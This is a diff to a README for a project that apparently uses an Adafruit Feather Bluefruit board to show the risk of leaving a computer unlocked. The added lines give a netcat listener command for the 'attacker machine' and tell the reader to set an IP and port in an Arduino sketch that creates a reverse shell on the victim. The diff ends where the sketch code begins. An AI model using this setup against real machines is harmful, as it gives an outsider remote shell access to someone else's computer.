@@ -10,7 +10,13 @@ To demonstrate the risk inhereted when a person leaves a computer unlocked and u
 Adafruit Feather 32u4 Bluefruit LE
 More information can be found [here](https://www.adafruit.com/product/2829)
 
-### Process: 
+
+### On the Attacker Machine: 
+```bash
+  nc -lvp 1337
+```
+
+### Victim Machine: 
 + Change the ip address and port within the Arduino Sketch to the ip and port that you will be using on the host machine
 ```C
   // Create rsh
